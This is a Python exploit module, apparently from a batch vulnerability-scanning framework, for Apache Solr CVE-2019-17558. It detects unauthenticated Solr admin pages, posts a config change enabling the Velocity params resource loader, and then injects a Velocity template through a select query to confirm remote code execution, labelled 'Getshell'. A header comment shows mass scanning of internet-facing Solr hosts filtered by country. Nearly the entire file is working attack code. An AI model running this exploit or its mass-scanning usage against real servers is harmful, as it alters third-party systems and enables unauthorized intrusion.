# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-10 14:14

from colorama import Fore
from tqdm import tqdm

from exploit.web import BaseScript
from core.MyEnums import BugType, BugLevel
from core.MyAsyncHttp import *


# python batch.py -m exploit.web.Solr.Solr_template_rce -fs "app=\"APACHE-Solr\" && country=\"CN\"" -cs

class Script(BaseScript):
    name = 'Solr'

    def __init__(self, target, pbar, semaphore):
        super().__init__()
        # basic
        self.target = target
        self.bugLevel = BugLevel.HIGH
        self.bugType = BugType.RCE
        self.bugNumber = 'CVE-2019-17558'
        self.refer = ''
        self.pbar = pbar
        self.semaphore = semaphore
        # main
        self.detectList = ['/', '/solr']
        self.payloadList = ['/solr/admin/cores?indexInfo=false&wt=json']

    async def detect(self):
        try:
            async with self.semaphore:
                async with aiohttp.ClientSession(headers=self.headers) as session:
                    for detectPath in self.detectList:
                        url = f'http://{self.target}{detectPath}' if self.target.startswith(
                            ('http:', 'https:')) is False else f'{self.target}{detectPath}'
                        text = await AsyncFetcher.fetch(session=session, url=url)
                        if 'Solr Admin' in text:
                            self.flag = True
                            tqdm.write(Fore.RED + '[{}] {}'.format('Solr Unauth', url))
                            return {'name': 'Solr Unauth', 'url': url, 'software': 'Solr'}
        except Exception:
            return None

    async def exploit(self):
        try:
            async with self.semaphore:
                async with aiohttp.ClientSession() as session:
                    for payload in self.payloadList:
                        url1 = f'http://{self.target}{payload}' if self.target.startswith(
                            ('http:', 'https:')) is False else f'{self.target}{payload}'
                        # 获取节点名称
                        async with session.get(url=url1, headers=self.headers) as resp1:
                            text = await resp1.json()
                            if text.get('status'):
                                for name in text.get('status'):
                                    url2 = 'http://' + self.target + '/solr/' + name + '/config'
                                    headers = {'Content-Type': 'application/json'}
                                    data = '''                                    
                                    {
                                        "update-queryresponsewriter": {
                                            "startup": "lazy",
                                            "name": "velocity",
                                            "class": "solr.VelocityResponseWriter",
                                            "template.base.dir": "",
                                            "solr.resource.loader.enabled": "true",
                                            "params.resource.loader.enabled": "true"
                                        }
                                    }
                                    '''
                                    # 请求开启params.resource.loader.enabled
                                    async with session.post(url=url2, headers=headers, data=data) as resp2:
                                        if resp2 is not None and resp2.status == 200:
                                            ran1 = random.randint(100, 999)
                                            ran2 = random.randint(100, 999)
                                            # 请求命令执行
                                            url3 = 'http://' + self.target + '/solr/' + name + '/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set(%24c%3D{ran1}%20*%20{ran2})%24c'.format(
                                                ran1=ran1, ran2=ran2)
                                            async with session.get(url=url3, allow_redirects=False) as resp3:
                                                text2 = await resp3.text()
                                                if str(ran1 * ran2) in text2:
                                                    tqdm.write(Fore.RED + '[{}] {}'.format('Solr Getshell', url3))
                                                    return {'name': 'Solr Getshell', 'url': url3, 'software': 'Solr'}
        except Exception:
            return None

    async def attack(self):
        a = await self.detect()
        if a is not None:
            self.vulList.append(a)
            if self.flag:
                b = await self.exploit()
                if b is not None:
                    self.vulList.append(b)
                # c = await self.exec()
                # if c is not None:
                #     self.vulList.append(c)
        self.pbar.update(1)
        return self.vulList


if __name__ == '__main__':
    sem = asyncio.Semaphore(500)
    sc = Script('192.168.4.137:8983', 1, sem)
    l = asyncio.get_event_loop()
    l.run_until_complete(sc.attack())
